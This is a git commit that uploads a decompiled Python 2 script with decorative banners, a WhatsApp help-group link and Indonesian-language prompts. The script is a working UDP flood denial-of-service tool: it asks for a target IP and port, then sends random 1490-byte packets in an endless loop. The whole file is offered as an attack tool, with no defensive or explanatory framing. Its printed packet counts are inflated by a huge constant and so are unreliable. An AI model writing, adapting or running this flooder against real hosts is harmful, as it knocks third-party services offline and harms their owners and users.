c6e579c29c04ad9160c3bb9ea1429298676b3604
omarv7y <70105391+omarv7y@users.noreply.github.com>
2020-12-05 18:22:21 +0200

    Add files via upload

---
+++ Lahtsh,omar.py
@@ -0,0 +1,78 @@
+##################################################
+#> >>>>>>help>  https://chat.whatsapp.com/GVUPFI3cNBVKmmtJVG6ea3
+#
+#         ___  __  __    _    ____
+#        / _ \|  \/  |  / \  |  _ \
+#       | | | | |\/| | / _ \ | |_) |
+#       | |_| | |  | |/ ___ \|  _ <
+#        \___/|_|  |_/_/   \_\_| \_\
+#>>>>======================================================
+#  >
+#
+#
+#
+#
+#
+############################################################
+# Decompiled By RandiSr
+# Github : https://github.com/RANDIOLOY
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:44:54) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: <febry>
+import sys, os, time, socket
+import random
+from datetime import datetime
+a = datetime.now().strftime('%Y-%m-%d %H:%M')
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system('git pull')
+os.system('clear')
+os.system('figlet omar')
+print ("")
+print ('')
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(00000.015)
+
+#print ("\033[1;31m=====================================================================             >
+#print ("")
+#print ("")
+#print ("")
+#print ("")                                                                                          
+jalan("\033[1;31m>>> db       .d8b.  db   db d888888b .d8888. db   db" )                             
+jalan("\033[1;31m>>> 88      d8' `8b 88   88 `~~88~~' 88'  YP 88   88 ")
+jalan("\033[1;33m>>> 88      88ooo88 88ooo88    88    `8bo.   88ooo88 ")                             
+jalan("\033[1;33m>>> 88      88~~~88 88~~~88    88      `Y8b. 88~~~88 ")
+jalan("\033[1;37m>>> 88booo. 88   88 88   88    88    db   8D 88   88 ")
+jalan("\033[1;37m>>> Y88888P YP   YP YP   YP    YP    `8888Y' YP   YP ")
+jalan('>>>++ kry <<<')
+print '\x1b[32;1m<=======================================>'
+print '\x1b[34;1m||========>LORIS<=========||'
+print '\x1b[32;1m<=======================================>'
+print 'RECODE=mrlinkerrorsystem'
+print
+ip = raw_input('MASUKAN IP TAGET ===> ')
+port = input('Port /8080  ,5555  ,4444 , 80 , 1000,....   ===> ')
+os.system('clear')
+os.system('figlet Loading..')
+print 'membutuhkan waktu 5 detik'
+time.sleep(5)
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 10000000000000000000L
+    port = port + 0
+    print '\x1b[32;1mMengirim %s packet ke %s throught port:%s' % (sent, ip, port)
+    if port == 65534:
+        port = 0
+
